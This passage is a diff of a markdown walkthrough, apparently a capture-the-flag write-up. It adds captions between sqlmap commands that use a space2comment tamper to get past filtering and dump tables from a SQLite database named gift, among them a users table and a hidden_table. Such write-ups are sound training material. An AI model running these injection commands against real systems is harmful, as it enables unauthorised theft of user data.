@@ -184,11 +184,15 @@ sqlmap -r search.txt --tamper=space2comment --dbms sqlite
 sqlmap -r search.txt --tamper=space2comment --dbms sqlite --count
 ```
 
+there are 3 tables
+
 ![image](https://user-images.githubusercontent.com/90561566/215719719-b69bd70d-b772-464c-beed-3f9b2951fc14.png)
 
 ```
 sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T sequels --dump
 ```
+
+dump sequels table
 
 ![image](https://user-images.githubusercontent.com/90561566/215719968-229214a7-2d06-484f-af7f-682e5dd0200b.png)
 
@@ -196,11 +200,15 @@ sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T sequels --d
 sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T hidden_table --dump
 ```
 
+dump hidden_table table
+
 ![image](https://user-images.githubusercontent.com/90561566/215720305-8df1fab2-7875-4d3f-b4a3-d2de8810c197.png)
 
 ```
 sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T users --dump
 ```
+
+dump users table
 
 ![image](https://user-images.githubusercontent.com/90561566/215720658-79367815-78db-4588-ad49-eaf49612d0ba.png)
 
